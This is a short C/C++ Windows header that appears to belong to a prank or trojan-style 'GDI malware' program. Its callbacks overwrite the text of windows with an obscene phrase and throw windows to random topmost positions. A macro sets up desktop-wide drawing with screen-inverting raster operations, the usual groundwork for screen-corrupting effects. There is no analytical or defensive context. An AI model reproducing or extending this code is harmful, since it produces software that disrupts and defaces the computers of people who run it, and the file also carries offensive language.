#pragma once

#include <windows.h>

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)TEXT("Tech Cunt"), SMTO_ABORTIFHUNG, 100, NULL);

	return TRUE;
}

BOOL CALLBACK EnumChildProc2(HWND hwnd, LPARAM lParam) {

	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	DWORD hwndProcessId;
	GetWindowThreadProcessId(hwnd, &hwndProcessId);

	SetWindowPos(hwnd, HWND_TOPMOST, rand() % w, rand() % h, 0, 0, SWP_SHOWWINDOW | SWP_NOSIZE);

	return TRUE;
}


#define hdcs \
HWND hwnd = GetDesktopWindow(); \
HDC hdc = GetWindowDC(hwnd); \
HDC hdc2 = CreateCompatibleDC(hdc); \
RECT rect; \
GetWindowRect(hwnd, &rect); \
int w = rect.right - rect.left; \
int h = rect.bottom - rect.top; \
int invert = NOTSRCCOPY; \
POINT c; \
GetCursorPos(&c); \
int ix = GetSystemMetrics(SM_CXICON) / 2; \
int iy = GetSystemMetrics(SM_CYICON) / 2; \
SetBkColor(hdc, TRANSPARENT); \
int yPower = 10; \
int xPower = 0;